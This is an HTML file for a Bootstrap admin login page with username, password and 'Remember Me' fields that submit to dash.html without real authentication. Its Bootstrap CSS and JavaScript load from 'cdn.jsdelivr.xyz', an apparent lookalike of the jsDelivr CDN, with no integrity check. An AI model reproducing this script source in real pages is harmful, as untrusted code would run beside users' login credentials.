<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Login page</title>
    <link
      rel="stylesheet"
      href="https://cdn.jsdelivr.xyz/npm/bootstrap@5.3.1/dist/css/bootstrap.min.css"
    />
    <link
      rel="stylesheet"
      href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.2/css/all.min.css"
      integrity="sha512-z3gLpd7yknf1YoNbCzqRKc4qyor8gaKU1qmn+CShxbuBusANI9QpRohGBreCFkKxLhei6S9CQXFEbbKuqLg0DA=="
      crossorigin="anonymous"
      referrerpolicy="no-referrer"
    />
  </head>
  <body class="bg-light">
    <div class="container">
      <div class="row justify-content-center">
        <div class="col-md-4">
          <div class="card mt-5">
            <div class="card-header bg-primary text-white">Login as admin</div>
            <div class="card-body">
              <form action="dash.html">
                <div class="form-floating mb-3">
                  <input
                    type="text"
                    id="user-name"
                    class="form-control p-4 mb-3"
                    autofocus
                  />
                  <label for="user-name">User name</label>
                </div>
                <div class="form-floating mb-3">
                  <input
                    type="password"
                    id="password"
                    class="form-control p-4 mb-3"
                    autofocus
                  />
                  <label for="password">Password</label>
                </div>
                <div class="form-check mb-3">
                  <input
                    type="checkbox"
                    id="rememberme"
                    class="form-check-input"
                  /><label for="rememberme"> Remeber Me</label>
                </div>
                <div class="d-grid">
                  <button class="btn btn-success">
                    <label> <i class="fa-solid fa-right-to-bracket"></i></label>
                    Login as admin
                  </button>
                </div>
              </form>
            </div>
          </div>
        </div>
      </div>
    </div>
    <script src="https://cdn.jsdelivr.xyz/npm/bootstrap@5.3.1/dist/js/bootstrap.bundle.min.js"></script>
  </body>
</html>
